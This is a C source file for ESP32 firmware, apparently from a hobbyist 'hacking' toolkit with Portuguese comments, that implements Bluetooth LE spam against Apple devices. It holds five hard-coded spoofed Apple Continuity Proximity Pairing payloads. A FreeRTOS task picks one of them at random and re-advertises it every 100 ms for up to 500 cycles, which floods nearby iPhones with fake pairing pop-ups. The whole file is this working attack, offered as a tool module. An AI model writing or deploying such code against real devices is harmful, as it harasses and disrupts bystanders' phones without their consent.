#include "hacking_ble.h"
#include "transport_ble.h"
#include "tlv.h"

#include <stdlib.h>
#include <string.h>

#include "esp_log.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "host/ble_hs.h"
#include "host/ble_gap.h"

static const char *TAG = "hack-ble";

// Apple Continuity Proximity Pairing payloads (subtype 0x07).
// 29 bytes por entrada, 5 modelos.
#define APPLE_PAYLOAD_LEN 29
#define APPLE_NUM_MODELS  5

static const uint8_t apple_payloads[APPLE_NUM_MODELS][APPLE_PAYLOAD_LEN] = {
    {0x4C,0x00, 0x07, 0x19, 0x01, 0x02,0x20, 0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12, 0,0,0,0,0,0,0,0,0,0,0,0},
    {0x4C,0x00, 0x07, 0x19, 0x01, 0x0E,0x20, 0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12, 0,0,0,0,0,0,0,0,0,0,0,0},
    {0x4C,0x00, 0x07, 0x19, 0x01, 0x0A,0x20, 0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12, 0,0,0,0,0,0,0,0,0,0,0,0},
    {0x4C,0x00, 0x07, 0x19, 0x01, 0x06,0x20, 0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12, 0,0,0,0,0,0,0,0,0,0,0,0},
    {0x4C,0x00, 0x07, 0x19, 0x01, 0x10,0x20, 0x75,0xAA,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12, 0,0,0,0,0,0,0,0,0,0,0,0},
};

static volatile bool s_busy = false;
static TaskHandle_t s_task = NULL;
static uint8_t s_seq = 0;

bool hacking_ble_busy(void)
{
    return s_busy;
}

esp_err_t hacking_ble_init(void)
{
    ESP_LOGI(TAG, "ready (%d apple models)", APPLE_NUM_MODELS);
    return ESP_OK;
}

static int spam_event_cb(struct ble_gap_event *event, void *arg)
{
    (void)event; (void)arg;
    return 0;
}

static void emit_spam_done(uint16_t sent, uint16_t requested)
{
    uint8_t payload[4];
    payload[0] = (uint8_t)(sent >> 8);      payload[1] = (uint8_t)(sent & 0xFF);
    payload[2] = (uint8_t)(requested >> 8); payload[3] = (uint8_t)(requested & 0xFF);

    uint8_t frame[TLV_MAX_FRAME_SIZE];
    int total = tlv_encode(frame, sizeof(frame),
                           TLV_MSG_HACK_BLE_SPAM_DONE, s_seq++,
                           payload, sizeof(payload));
    if (total > 0) transport_ble_send_stream(frame, (size_t)total);
}

static void apple_spam_task(void *arg)
{
    uint16_t cycles = (uint16_t)(uintptr_t)arg;

    // Pausa adv normal (será retomada ao final ou no disconnect).
    ble_gap_adv_stop();

    uint16_t sent = 0;
    for (uint16_t i = 0; i < cycles; i++) {
        uint32_t r = esp_random();
        size_t pidx = r % APPLE_NUM_MODELS;

        ble_gap_adv_stop();

        struct ble_hs_adv_fields fields = {0};
        fields.mfg_data = apple_payloads[pidx];
        fields.mfg_data_len = APPLE_PAYLOAD_LEN;

        int rc = ble_gap_adv_set_fields(&fields);
        if (rc != 0) {
            ESP_LOGW(TAG, "set_fields rc=%d", rc);
            continue;
        }

        struct ble_gap_adv_params params = {0};
        params.conn_mode = BLE_GAP_CONN_MODE_NON;
        params.disc_mode = BLE_GAP_DISC_MODE_NON;
        params.itvl_min = 0x20;
        params.itvl_max = 0x30;

        rc = ble_gap_adv_start(BLE_OWN_ADDR_PUBLIC, NULL, BLE_HS_FOREVER,
                               &params, spam_event_cb, NULL);
        if (rc != 0) {
            ESP_LOGW(TAG, "adv_start rc=%d", rc);
            continue;
        }

        sent++;
        vTaskDelay(pdMS_TO_TICKS(100));
    }

    ble_gap_adv_stop();

    transport_ble_advertising_resume();

    ESP_LOGI(TAG, "apple spam done: %u/%u cycles",
             (unsigned)sent, (unsigned)cycles);

    emit_spam_done(sent, cycles);

    s_task = NULL;
    s_busy = false;
    vTaskDelete(NULL);
}

esp_err_t hacking_ble_apple_spam(uint16_t cycles)
{
    if (s_busy) return ESP_ERR_INVALID_STATE;
    if (cycles == 0) cycles = 50;
    if (cycles > 500) cycles = 500;

    s_busy = true;
    if (xTaskCreate(apple_spam_task, "apple_spam", 4096,
                    (void *)(uintptr_t)cycles, 5, &s_task) != pdPASS) {
        s_busy = false;
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}
